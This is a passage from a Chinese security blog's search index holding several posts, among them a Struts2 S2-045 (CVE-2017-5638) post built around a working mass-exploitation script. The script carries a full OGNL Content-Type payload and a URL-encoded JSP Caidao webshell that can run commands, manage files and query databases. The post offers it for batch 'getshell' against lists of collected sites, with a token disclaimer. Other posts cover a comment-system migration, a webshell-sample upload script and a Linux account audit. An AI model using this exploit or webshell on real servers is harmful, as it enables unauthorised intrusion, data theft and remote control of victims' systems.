--single-version-externally-managed --compile --install-headers g:\\coding\\python\\qingteng\\crawl\\w3af\\venv\\include\\site\\python2.7\\esmre&quot; failed with error code 1 in c:\\users\\admini~1\\appdata\\local\\temp\\pip-build-attjnf\\esmre\\``` &gt; 到C:\\Users\\Administrator\\AppData\\Local\\Programs\\Common\\Microsoft\\Visual C++ for Python\\9.0\\VC\\include目录下，创建一个stdbool.h，内容如下： typedef int bool; #define false 0 #define true 1```","tags":[{"name":"python","slug":"python","permalink":"http://pirogue.org/tags/python/"},{"name":"信息安全","slug":"信息安全","permalink":"http://pirogue.org/tags/信息安全/"},{"name":"黑客","slug":"黑客","permalink":"http://pirogue.org/tags/黑客/"},{"name":"tornado","slug":"tornado","permalink":"http://pirogue.org/tags/tornado/"},{"name":"Web自动化攻击平台","slug":"Web自动化攻击平台","permalink":"http://pirogue.org/tags/Web自动化攻击平台/"}]},{"title":"hexo留言板从多说迁移到网易云跟帖","date":"2017-04-05T08:51:55.000Z","path":"2017/04/05/hexo-guestbook/","text":"迁移原因123重要通知: 多说即将关闭多说网 发表于 3月21日因公司业务调整，非常遗憾的向大家宣布多说项目即将关闭。 我们将于2017年6月1日正式关停服务，在此之前您可以通过后台的数据导出功能导出自己站点的评论数据。 对此给您造成的不便，我们深表歉意，感谢您的一路相伴。 修改相应代码1. 修改文章底部评论框post.jade留言框主要在文章的内容页，所以要替换留言处相应的代码。 你可能会发现如下的调用代码: 12#comments include _partial/comments 再到模板目录下的_partial目录修改comments.jade 123456789101112131415161718192021if theme.duoshuo .ds-thread(data-thread-key=page.path, data-title=page.title, data-url=page.permalink, data-author-key='1') if theme.disqus #disqus_threadif theme.youyan &lt;div id=\"uyan_frame\"&gt; script(type='text/javascript' src='//v2.uyan.cc/code/uyan.js?uid=#&#123;theme.youyan&#125;') &lt;/div&gt;if theme.yungentie &lt;div id=\"cloud-tie-wrapper\" class=\"cloud-tie-wrapper\"&gt;&lt;/div&gt; script(type=\"text/javascript\"). var cloudTieConfig = &#123; url: document.location.href, sourceId: \"\", productKey: \"cb283a9f048249cf8c427834214ebaaf\", target: \"cloud-tie-wrapper\" &#125;; script(type='text/javascript' src='//img1.cache.netease.com/f2e/tie/yun/sdk/loader.js') 2. 修改文章内容页评论参与数 1234567891011if theme.duoshuo a.ds-thread-count(data-thread-key=page.path, href=url_for(page.path) + '#comments')if theme.disqus a.disqus-comment-count(data-disqus-identifier=page.path, href=url_for(page.path) + '#disqus_thread')if theme.yungentie &lt;div class=\"ds-thread-count\"&gt; &lt;a class=\"cloud-tie-join-count\" href=\"javascript:void(0);\" &gt; &lt;span class=\"join-count\" data-url=page.path &gt;0&lt;/span&gt; &lt;span class=\"join-text\"&gt;评论&lt;/span&gt; &lt;/a&gt; &lt;/div&gt; 3. 修改page.jade如果你的博客在关于我页面也存在留言板，可以修改相应的单页模板。 123if page.comments #comments include _partial/comments 发现我的这个页面的模板也是调用的单独的评论页模板。 遗憾 首页的文章评论数无法显示 我调试了很久都无法实现，如果您刚好实现了这个功能请分享给我，谢谢啦。 首页的最近评论列表无法调用 网易云跟帖无此功能~…","tags":[{"name":"博客","slug":"博客","permalink":"http://pirogue.org/tags/博客/"},{"name":"hexo","slug":"hexo","permalink":"http://pirogue.org/tags/hexo/"},{"name":"留言板","slug":"留言板","permalink":"http://pirogue.org/tags/留言板/"}]},{"title":"s2-045真正一键getshell菜刀马-突破任何限制","date":"2017-03-08T17:23:43.000Z","path":"2017/03/09/s2-045真正一键getshell菜刀马-突破任何限制/","text":"综述 Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。该漏洞能够通过构造恶意的Content-Type值来执行任意代码。 如果Content-Type值无效，则会抛出异常，并向用户显示错误消息，从而能够进一步获取服务器权限。 漏洞概述 漏洞类型： 远程代码执行漏洞危险等级： 高危利用条件： Struts2在受影响版本内，并包含Commons-FileUpload、Commons-IO库受影响版本： Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10 漏洞编号 CVE-2017-5638 Struts2远程代码执行漏洞 漏洞描述 Struts2在受影响版本内，并包含Commons-FileUpload、Commons-IO库时，该漏洞能够通过构造恶意的Content-Type值来执行任意代码。 如果Content-Type值无效，则会抛出异常，并向用户显示错误消息，从而能够进一步获取服务器权限。 修复建议 安装官方补丁升级到最新版本：Struts 2.3.32 or Struts 2.5.10.1 临时修复方法： Struts 2默认使用Jakarta的Common-FileUpload文件上传解析器，修改上传解析器为cos或pell。 Show ME Code ㋡exploit 正好可以学以致用，前几天刚介绍了Python的poster模块，可以参考上一篇文章。 说明： 真正一键getshell 原理是将菜刀一句话进行拆分为6个任意后缀文件，urlencod编码，在写入文件的时候将脚本decode写入web根目录；最后再写入第7个jsp脚本，此脚本内容include前面6个文件，即可实现生成一句话菜刀连接马； 使用时请先将确认存在漏洞的网站放进url.txt文件内，然后再使用此脚本自动getshell，原因是毕竟要写7个文件，多线程处理的时候没有做判断，会额外跑很多次无用的url，懒得动脑改了，毕竟咱不是要去干坏事，只是跟大家学习交流呀~ 运行时屏幕会打印每次请求写入服务请求的response，仅仅是提示用，可以忽略，最后看生成的result+时间.txt的文本文件； 学习了@_luan 的绝对路径写文件 @lostwolf 的编码等思路，结合了jsp文件包含的特性； 请勿用作非法用途！ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#!/usr/bin/env python# -*- coding: utf-8 -*-# ------------------------------------------------------------------------------# Name: struts2 045 exploit tools# Author: pirogue# Created: 2017年3月2日12:48:09# Site: http://www.pirogue.org# useage: python pi_struts2-045.py xxx.txt 5# ------------------------------------------------------------------------------ import urllib2import sysimport timefrom multiprocessing.dummy import Pool as ThreadPoolfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openers reload(sys)sys.setdefaultencoding = 'utf-8' class Pi_Struts2_045(object): \"\"\"init variables\"\"\" def __init__(self, sthreads, num): # self.surl = surl self.stime = time.strftime(\"%Y-%m-%d%H%M%S\", time.localtime()) self.sthreads = sthreads self.datagen, self.header = multipart_encode( &#123;\"image1\": open(\"tmp.txt\", \"rb\")&#125;) self.header[\"User-agent\"] = \"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257 MicroMessenger/6.0.1 NetType/WIFI\" self.webshell_txt_1 = '%3C%25%21%0D%0AString%20Pwd%3D%22pi%22%3B%0D%0AString%20EC%28String%20s%2CString%20c%29throws%20Exception%7Breturn%20s%3B%7D%2F%2Fnew%20String%28s.getBytes%28%22ISO-8859-1%22%29%2Cc%29%3B%7D%0D%0AConnection%20GC%28String%20s%29throws%20Exception%7BString%5B%5D%20x%3Ds.trim%28%29.split%28%22%5Cr%5Cn%22%29%3BClass.forName%28x%5B0%5D.trim%28%29%29.newInstance%28%29%3B%0D%0AConnection%20c%3DDriverManager.getConnection%28x%5B1%5D.trim%28%29%29%3Bif%28x.length%3E2%29%7Bc.setCatalog%28x%5B2%5D.trim%28%29%29%3B%7Dreturn%20c%3B%7D%0D%0Avoid%20AA%28StringBuffer%20sb%29throws%20Exception%7BFile%20r%5B%5D%3DFile.listRoots%28%29%3Bfor%28int%20i%3D0%3Bi%3Cr.length%3Bi%2B%2B%29%7Bsb.append%28r%5Bi%5D.toString%28%29.substring%280%2C2%29%29%3B%7D%7D%0D%0Avoid%20BB%28String%20s%2CStringBuffer%20sb%29throws%20Exception%7BFile%20oF%3Dnew%20File%28s%29%2Cl%5B%5D%3DoF.listFiles%28%29%3BString%20sT%2C%20sQ%2CsF%3D%22%22%3Bjava.util.Date%20dt%3B%0D%0ASimpleDateFormat%20fm%3Dnew%20SimpleDateFormat%28%22yyyy-MM-dd%20HH%3Amm%3Ass%22%29%3Bfor%28int%20i%3D0%3Bi%3Cl.length%3Bi%2B%2B%29%7Bdt%3Dnew%20java.util.Date%28l%5Bi%5D.lastModified%28%29%29%3B%0D%0AsT%3Dfm.format%28dt%29%3BsQ%3Dl%5Bi%5D.canRead%28%29%3F%22R%22%3A%22%22%3BsQ%2B%3Dl%5Bi%5D.canWrite%28%29%3F%22%20W%22%3A%22%22%3Bif%28l%5Bi%5D.isDirectory%28%29%29%7Bsb.append%28l%5Bi%5D.getName%28%29%2B%22%2F%5Ct%22%2BsT%2B%22%5Ct%22%2Bl%5Bi%5D.length%28%29%2B%22%5Ct%22%2BsQ%2B%22%5Cn%22%29%3B%7D%25%3E' self.webshell_txt_2 = '%3C%25%21%20else%7BsF%2B%3Dl%5Bi%5D.getName%28%29%2B%22%5Ct%22%2BsT%2B%22%5Ct%22%2Bl%5Bi%5D.length%28%29%2B%22%5Ct%22%2BsQ%2B%22%5Cn%22%3B%7D%7Dsb.append%28sF%29%3B%7D%0D%0Avoid%20EE%28String%20s%29throws%20Exception%7BFile%20f%3Dnew%20File%28s%29%3Bif%28f.isDirectory%28%29%29%7BFile%20x%5B%5D%3Df.listFiles%28%29%3B%0D%0Afor%28int%20k%3D0%3Bk%3Cx.length%3Bk%2B%2B%29%7Bif%28%21x%5Bk%5D.delete%28%29%29%7BEE%28x%5Bk%5D.getPath%28%29%29%3B%7D%7D%7Df.delete%28%29%3B%7D%0D%0Avoid%20FF%28String%20s%2CHttpServletResponse%20r%29throws%20Exception%7Bint%20n%3Bbyte%5B%5D%20b%3Dnew%20byte%5B512%5D%3Br.reset%28%29%3B%0D%0AServletOutputStream%20os%3Dr.getOutputStream%28%29%3BBufferedInputStream%20is%3Dnew%20BufferedInputStream%28new%20FileInputStream%28s%29%29%3B%0D%0Aos.write%28%28%22-%3E%22%2B%22%7C%22%29.getBytes%28%29%2C0%2C3%29%3Bwhile%28%28n%3Dis.read%28b%2C0%2C512%29%29%21%3D-1%29%7Bos.write%28b%2C0%2Cn%29%3B%7Dos.write%28%28%22%7C%22%2B%22%3C-%22%29.getBytes%28%29%2C0%2C3%29%3Bos.close%28%29%3Bis.close%28%29%3B%7D%0D%0Avoid%20GG%28String%20s%2C%20String%20d%29throws%20Exception%7BString%20h%3D%220123456789ABCDEF%22%3Bint%20n%3BFile%20f%3Dnew%20File%28s%29%3Bf.createNewFile%28%29%3B%0D%0AFileOutputStream%20os%3Dnew%20FileOutputStream%28f%29%3Bfor%28int%20i%3D0%3Bi%3Cd.length%28%29%3Bi%2B%3D2%29%0D%0A%7Bos.write%28%28h.indexOf%28d.charAt%28i%29%29%3C%3C4%7Ch.indexOf%28d.charAt%28i%2B1%29%29%29%29%3B%7Dos.close%28%29%3B%7D%0D%0Avoid%20HH%28String%20s%2CString%20d%29throws%20Exception%7BFile%20sf%3Dnew%20File%28s%29%2Cdf%3Dnew%20File%28d%29%3Bif%28sf.isDirectory%28%29%29%7Bif%28%21df.exists%28%29%29%7Bdf.mkdir%28%29%3B%7DFile%20z%5B%5D%3Dsf.listFiles%28%29%3B%0D%0Afor%28int%20j%3D0%3Bj%3Cz.length%3Bj%2B%2B%29%7BHH%28s%2B%22%2F%22%2Bz%5Bj%5D.getName%28%29%2Cd%2B%22%2F%22%2Bz%5Bj%5D.getName%28%29%29%3B%7D%0D%0A%7Delse%7BFileInputStream%20is%3Dnew%20FileInputStream%28sf%29%3BFileOutputStream%20os%3Dnew%20FileOutputStream%28df%29%3B%0D%0Aint%20n%3Bbyte%5B%5D%20b%3Dnew%20byte%5B512%5D%3Bwhile%28%28n%3Dis.read%28b%2C0%2C512%29%29%21%3D-1%29%7Bos.write%28b%2C0%2Cn%29%3B%7Dis.close%28%29%3Bos.close%28%29%3B%7D%7D%0D%0Avoid%20II%28String%20s%2CString%20d%29throws%20Exception%7BFile%20sf%3Dnew%20File%28s%29%2Cdf%3Dnew%20File%28d%29%3Bsf.renameTo%28df%29%3B%7Dvoid%20JJ%28String%20s%29throws%20Exception%7BFile%20f%3Dnew%20File%28s%29%3Bf.mkdir%28%29%3B%7D%25%3E' self.webshell_txt_3 = '%3C%25%21void%20KK%28String%20s%2CString%20t%29throws%20Exception%7BFile%20f%3Dnew%20File%28s%29%3BSimpleDateFormat%20fm%3Dnew%20SimpleDateFormat%28%22yyyy-MM-dd%20HH%3Amm%3Ass%22%29%3B%0D%0Ajava.util.Date%20dt%3Dfm.parse%28t%29%3Bf.setLastModified%28dt.getTime%28%29%29%3B%7D%0D%0Avoid%20LL%28String%20s%2C%20String%20d%29throws%20Exception%7BURL%20u%3Dnew%20URL%28s%29%3Bint%20n%3BFileOutputStream%20os%3Dnew%20FileOutputStream%28d%29%3B%0D%0AHttpURLConnection%20h%3D%28HttpURLConnection%29u.openConnection%28%29%3BInputStream%20is%3Dh.getInputStream%28%29%3Bbyte%5B%5D%20b%3Dnew%20byte%5B512%5D%3B%0D%0Awhile%28%28n%3Dis.read%28b%2C0%2C512%29%29%21%3D-1%29%7Bos.write%28b%2C0%2Cn%29%3B%7Dos.close%28%29%3Bis.close%28%29%3Bh.disconnect%28%29%3B%7D%0D%0Avoid%20MM%28InputStream%20is%2C%20StringBuffer%20sb%29throws%20Exception%7BString%20l%3BBufferedReader%20br%3Dnew%20BufferedReader%28new%20InputStreamReader%28is%29%29%3B%0D%0Awhile%28%28l%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28l%2B%22%5Cr%5Cn%22%29%3B%7D%7D%0D%0Avoid%20NN%28String%20s%2CStringBuffer%20sb%29throws%20Exception%7BConnection%20c%3DGC%28s%29%3BResultSet%20r%3Dc.getMetaData%28%29.getCatalogs%28%29%3B%0D%0Awhile%28r.next%28%29%29%7Bsb.append%28r.getString%281%29%2B%22%5Ct%22%29%3B%7Dr.close%28%29%3Bc.close%28%29%3B%7D%0D%0Avoid%20OO%28String%20s%2CStringBuffer%20sb%29throws%20Exception%7BConnection%20c%3DGC%28s%29%3BString%5B%5D%20t%3D%7B%22TABLE%22%7D%3BResultSet%20r%3Dc.getMetaData%28%29.getTables%20%28null%2Cnull%2C%22%25%22%2Ct%29%3B%0D%0Awhile%28r.next%28%29%29%7Bsb.append%28r.getString%28%22TABLE%5FNAME%22%29%2B%22%5Ct%22%29%3B%7Dr.close%28%29%3Bc.close%28%29%3B%7D%25%3E' self.webshell_txt_4 = '%3C%25%21void%20PP%28String%20s%2CStringBuffer%20sb%29throws%20Exception%7BString%5B%5D%20x%3Ds.trim%28%29.split%28%22%5Cr%5Cn%22%29%3BConnection%20c%3DGC%28s%29%3B%0D%0AStatement%20m%3Dc.createStatement%281005%2C1007%29%3BResultSet%20r%3Dm.executeQuery%28%22select%20%2A%20from%20%22%2Bx%5B3%5D%29%3BResultSetMetaData%20d%3Dr.getMetaData%28%29%3B%0D%0Afor%28int%20i%3D1%3Bi%3C%3Dd.getColumnCount%28%29%3Bi%2B%2B%29%7Bsb.append%28d.getColumnName%28i%29%2B%22%20%28%22%2Bd.getColumnTypeName%28i%29%2B%22%29%5Ct%22%29%3B%7Dr.close%28%29%3Bm.close%28%29%3Bc.close%28%29%3B%7D%0D%0Avoid%20QQ%28String%20cs%2CString%20s%2CString%20q%2CStringBuffer%20sb%29throws%20Exception%7Bint%20i%3BConnection%20c%3DGC%28s%29%3BStatement%20m%3Dc.createStatement%281005%2C1008%29%3B%0D%0Atry%7BResultSet%20r%3Dm.executeQuery%28q%29%3BResultSetMetaData%20d%3Dr.getMetaData%28%29%3Bint%20n%3Dd.getColumnCount%28%29%3Bfor%28i%3D1%3Bi%3C%3Dn%3Bi%2B%2B%29%7Bsb.append%28d.getColumnName%28i%29%2B%22%5Ct%7C%5Ct%22%29%3B%0D%0A%7Dsb.append%28%22%5Cr%5Cn%22%29%3Bwhile%28r.next%28%29%29%7Bfor%28i%3D1%3Bi%3C%3Dn%3Bi%2B%2B%29%7Bsb.append%28EC%28r.getString%28i%29%2Ccs%29%2B%22%5Ct%7C%5Ct%22%29%3B%7Dsb.append%28%22%5Cr%5Cn%22%29%3B%7Dr.close%28%29%3B%7D%0D%0Acatch%28Exception%20e%29%7Bsb.append%28%22Result%5Ct%7C%5Ct%5Cr%5Cn%22%29%3Btry%7Bm.executeUpdate%28q%29%3Bsb.append%28%22Execute%20Successfully%21%5Ct%7C%5Ct%5Cr%5Cn%22%29%3B%0D%0A%7Dcatch%28Exception%20ee%29%7Bsb.append%28ee.toString%28%29%2B%22%5Ct%7C%5Ct%5Cr%5Cn%22%29%3B%7D%7Dm.close%28%29%3Bc.close%28%29%3B%7D%0D%0A%25%3E' self.webshell_txt_5 = '%3C%25%0D%0AString%20cs%3Drequest.getParameter%28%22z0%22%29%2B%22%22%3Brequest.setCharacterEncoding%28cs%29%3Bresponse.setContentType%28%22text%2Fhtml%3Bcharset%3D%22%2Bcs%29%3B%0D%0AString%20Z%3DEC%28request.getParameter%28Pwd%29%2B%22%22%2Ccs%29%3BString%20z1%3DEC%28request.getParameter%28%22z1%22%29%2B%22%22%2Ccs%29%3BString%20z2%3DEC%28request.getParameter%28%22z2%22%29%2B%22%22%2Ccs%29%3B%0D%0AStringBuffer%20sb%3Dnew%20StringBuffer%28%22%22%29%3Btry%7Bsb.append%28%22-%3E%22%2B%22%7C%22%29%3B%0D%0Aif%28Z.equals%28%22A%22%29%29%7BString%20s%3Dnew%20File%28application.getRealPath%28request.getRequestURI%28%29%29%29.getParent%28%29%3Bsb.append%28s%2B%22%5Ct%22%29%3Bif%28%21s.substring%280%2C1%29.equals%28%22%2F%22%29%29%7BAA%28sb%29%3B%7D%7D%0D%0Aelse%20if%28Z.equals%28%22B%22%29%29%7BBB%28z1%2Csb%29%3B%7Delse%20if%28Z.equals%28%22C%22%29%29%7BString%20l%3D%22%22%3BBufferedReader%20br%3Dnew%20BufferedReader%28new%20InputStreamReader%28new%20FileInputStream%28new%20File%28z1%29%29%29%29%3B%0D%0Awhile%28%28l%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28l%2B%22%5Cr%5Cn%22%29%3B%7Dbr.close%28%29%3B%7D%25%3E' self.webshell_txt_6 = '%3C%25else%20if%28Z.equals%28%22D%22%29%29%7BBufferedWriter%20pi%3Dnew%20BufferedWriter%28new%20OutputStreamWriter%28new%20FileOutputStream%28new%20File%28z1%29%29%29%29%3B%0D%0Api.write%28z2%29%3Bpi.close%28%29%3Bsb.append%28%221%22%29%3B%7Delse%20if%28Z.equals%28%22E%22%29%29%7BEE%28z1%29%3Bsb.append%28%221%22%29%3B%7Delse%20if%28Z.equals%28%22F%22%29%29%7BFF%28z1%2Cresponse%29%3B%7D%0D%0Aelse%20if%28Z.equals%28%22G%22%29%29%7BGG%28z1%2Cz2%29%3Bsb.append%28%221%22%29%3B%7Delse%20if%28Z.equals%28%22H%22%29%29%7BHH%28z1%2Cz2%29%3Bsb.append%28%221%22%29%3B%7Delse%20if%28Z.equals%28%22I%22%29%29%7BII%28z1%2Cz2%29%3Bsb.append%28%221%22%29%3B%7D%0D%0Aelse%20if%28Z.equals%28%22J%22%29%29%7BJJ%28z1%29%3Bsb.append%28%221%22%29%3B%7Delse%20if%28Z.equals%28%22K%22%29%29%7BKK%28z1%2Cz2%29%3Bsb.append%28%221%22%29%3B%7Delse%20if%28Z.equals%28%22L%22%29%29%7BLL%28z1%2Cz2%29%3Bsb.append%28%221%22%29%3B%7D%0D%0Aelse%20if%28Z.equals%28%22M%22%29%29%7BString%5B%5D%20c%3D%7Bz1.substring%282%29%2Cz1.substring%280%2C2%29%2Cz2%7D%3BProcess%20p%3DRuntime.getRuntime%28%29.exec%28c%29%3B%0D%0AMM%28p.getInputStream%28%29%2Csb%29%3BMM%28p.getErrorStream%28%29%2Csb%29%3B%7Delse%20if%28Z.equals%28%22N%22%29%29%7BNN%28z1%2Csb%29%3B%7Delse%20if%28Z.equals%28%22O%22%29%29%7BOO%28z1%2Csb%29%3B%7D%0D%0Aelse%20if%28Z.equals%28%22P%22%29%29%7BPP%28z1%2Csb%29%3B%7Delse%20if%28Z.equals%28%22Q%22%29%29%7BQQ%28cs%2Cz1%2Cz2%2Csb%29%3B%7D%0D%0A%7Dcatch%28Exception%20e%29%7Bsb.append%28%22ERROR%22%2B%22%3A%2F%2F%20%22%2Be.toString%28%29%29%3B%7Dsb.append%28%22%7C%22%2B%22%3C-%22%29%3Bout.print%28sb.toString%28%29%29%3B%0D%0A%25%3E' self.webshell_txt_7 = '%3C%25%40page%20import%3D%22java.io.%2A%2Cjava.util.%2A%2Cjava.net.%2A%2Cjava.sql.%2A%2Cjava.text.%2A%22%25%3E%3C%25%40include%20file%3D%221t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%222t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%223t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%224t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%225t00ls.jsp%22%25%3E%3C%25%40include%20file%3D%226t00ls.jsp%22%25%3E' self.num = str(num) self.header[\"Content-Type\"] = \"%&#123;(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ccccc='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#shell='\" + eval(\"self.webshell_txt_\"+ self.num)+\"').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'/\"+self.num+\"t00ls.jsp').append(new java.net.URLDecoder().decode(#shell,'UTF-8'))).close()).(#cmd='echo \\\\\\\"write file to '+#path+'/\"+ self.num +\"t00ls.jsp\\\\\\\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\" def spost_exp(self, ck_url): \"\"\"post payload\"\"\" # print self.header try: register_openers() request_s2_045 = urllib2.Request(ck_url, self.datagen, self.header) response_s2_045 = urllib2.urlopen(request_s2_045, timeout=5) res = response_s2_045.read() self.ensure(res, ck_url) except: print \"error---&gt;\" + ck_url def ensure(self, res, shost): \"\"\"output struts2 045 res\"\"\" print res # stime = time.strftime(\"%Y-%m-%d%H%M%S\", time.localtime()) if \"7t00ls\" in res: with open(self.stime+'result.txt', 'a') as f_s: f_s.write(res + shost) def check_url(self, url_txt): 'check url list' with open(url_txt, 'rb') as c_f: # print type(c_f) pool = ThreadPool(self.sthreads) pool.map(self.spost_exp, c_f) pool.close() pool.join() # for url in c_f: # self.spost_exp(stime ,url) # def read_file(self): # \"\"\"read webshell content to str\"\"\" # file_object = open('caidao.jsp', 'rb').read() # print file_object def main(): \"\"\"useage: python pi_struts2-045.py xxx.txt 5\"\"\" for i in range(1, 8): exploit = Pi_Struts2_045(int(sys.argv[2]), i) exploit.check_url(str(sys.argv[1])) if __name__ == '__main__': main() 使用方法目录结构：目录下需要3个文件： pi_struts2-045.py 上面python代码内容 tmp.txt exp脚本需要post的文件，内容为空即可 url.txt 采集到的url列表文件，一行一个 命令：python pi_struts2-045.py url.txt 81注：数字8代表线程数","tags":[{"name":"信息安全","slug":"信息安全","permalink":"http://pirogue.org/tags/信息安全/"},{"name":"黑客","slug":"黑客","permalink":"http://pirogue.org/tags/黑客/"},{"name":"exp","slug":"exp","permalink":"http://pirogue.org/tags/exp/"},{"name":"Struts2","slug":"Struts2","permalink":"http://pirogue.org/tags/Struts2/"},{"name":"网络安全","slug":"网络安全","permalink":"http://pirogue.org/tags/网络安全/"}]},{"title":"python使用poster模块上传文件和表单","date":"2017-03-03T02:30:32.000Z","path":"2017/03/03/python使用poster模块上传文件和表单/","text":"代码说明写这个脚本的时候是为了可以自动批量上传webshell样本到后台的样本库中，方便后面的其他处理工作。 涉及知识点 poster模块 http代理 http auth认证 在把脚本放上博客之前就把涉及到后台的敏感url、表单、认证、代理做了模糊处理，防止信息泄露造成不必要的麻烦~ 因为我自己在写的时候参考了部分网上代码，调试发现是错误的。所以把坑填平之后的代码放到博客来给有需要的朋友参考，少走弯路，欢迎交流。 调试错误例子：1234567891. File &quot;G:\\myenv\\Anaconda2\\lib\\urllib2.py&quot;, line 1136, in do_request_ &apos;Content-length&apos;, &apos;%d&apos; % len(data))AttributeError: multipart_yielder instance has no attribute &apos;__len__&apos;2. File &quot;G:\\myenv\\Anaconda2\\lib\\ntpath.py&quot;, line 115, in splitdrive if len(p) &gt; 1:TypeError: object of type &apos;file&apos; has no len() 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#!/usr/bin/env python# -*- coding: utf-8 -*-# ------------------------------------------------------------------------------# Name: back post webshell# Author: pirogue# Created: 2017年3月2日12:48:09# Site: http://www.pirogue.org# ------------------------------------------------------------------------------ import urllib2import os# import timeimport sysimport posterfrom poster.encode import multipart_encode, MultipartParam reload(sys)sys.setdefaultencoding = 'utf-8' class QT_Webfile: # init method def __init__(self): self.backurl = 'http://destination.com/xxoo/upload' # self.proxyURL = '' self.loginHeaders = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit'+ '/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36', 'Authorization': 'Basic ZnVjayB1IG5vdGhpbmc=', 'Cookie': 'qt_random_auth=abcddddddddddddd' &#125; # self.postData = urllib.urlencode(self.post) def postFileRequest(self, name, filename): # 表单字段字典形式 additionalParams = &#123; 'wbs_test[des]': name, 'wbs_test[xx]': 123, 'wbs_test[active]': 1 &#125; # 将表单字段key,value形式追加到列表处理 items = [] for name, value in additionalParams.items(): items.append(MultipartParam(name, value)) # 添加上传文件 items.append(MultipartParam.from_file(\"sample_file\", filename)) # print type(items) items.append(MultipartParam('wbs_test[id]', '')) # print type(items) datagen, headers = multipart_encode(items) # 将poster模块生成的header字段值加入到初始化的header中 header_new = [] for name, value in self.loginHeaders.items(): header_new.append((name, value)) for name, value in headers.items(): header_new.append((name, value)) # print header_new # opener绑定代理 opener = poster.streaminghttp.register_openers() proxy_handler = urllib2.ProxyHandler(&#123;'http':'114.113.112.111:2233'&#125;) opener.add_handler(proxy_handler) # urllib2安装全局opener urllib2.install_opener(opener) wbs_req = urllib2.Request(self.backurl, datagen, dict(header_new)) # print wbs_req # wbs_rep = urllib2.urlopen(wbs_req) wbs_rep = opener.open(wbs_req) print wbs_rep.read() def traverse_path(self): \"\"\"func travel path\"\"\" for root, dirs, files in os.walk(\".\", topdown=True): for name in files: print name self.postFileRequest(name, os.path.join(root, name)) def main(): \"\"\"main fuc\"\"\" Ss_Upload = QT_Webfile() Ss_Upload.traverse_path() if __name__ == '__main__': main() 参考链接 玩Python之HTTP代理 http://www.cnblogs.com/jackyspy/p/6027385.html poster模块MultipartParam https://atlee.ca/software/poster/poster.encode.html#poster.encode.MultipartParam Python中使用POST方式上传文件 http://zqpythonic.qiniucdn.com/data/20120615190732/index.html","tags":[{"name":"Python","slug":"Python","permalink":"http://pirogue.org/tags/Python/"},{"name":"poster模块","slug":"poster模块","permalink":"http://pirogue.org/tags/poster模块/"},{"name":"上传","slug":"上传","permalink":"http://pirogue.org/tags/上传/"}]},{"title":"Linux账户审计策略","date":"2017-02-19T07:05:29.000Z","path":"2017/02/19/Linux账户审计策略/","text":"一、账户管理1. 一个uid下多个用户、一个gid下多个用户 123456789101112131415161718192021222324252627282930313233343536[root@S959749 ~]# cat /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinabrt:x:173:173::/etc/abrt:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinsaslauth:x:499:76:&quot;Saslauthd user&quot;:/var/empty/saslauth:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologintcpdump:x:72:72::/:/sbin/nologin通过查看uid是否有相同的账号来判断是否uid唯一。cat /etc/grouproot:x:0:rootbin:x:1:root,bin,daemondaemon:x:2:root,bin,daemonsys:x:3:root,bin,adm通过检查/etc/group下最后一个冒号后用户名是否为多个来判断一个gid下是否存在多个用户，即gid唯一性检查。 2. Root权限账号、sudo权限账号、已禁用账号、无密码可sudo账号 Root权限账号 123456cat /etc/passwd通过查看uid为0的账号来判断是否有Root权限。cat /etc/group通过查看root用户组里的用户来判断root组里的其他用户也是具有root权限的。 sudo权限账号、无密码可sudo的账号 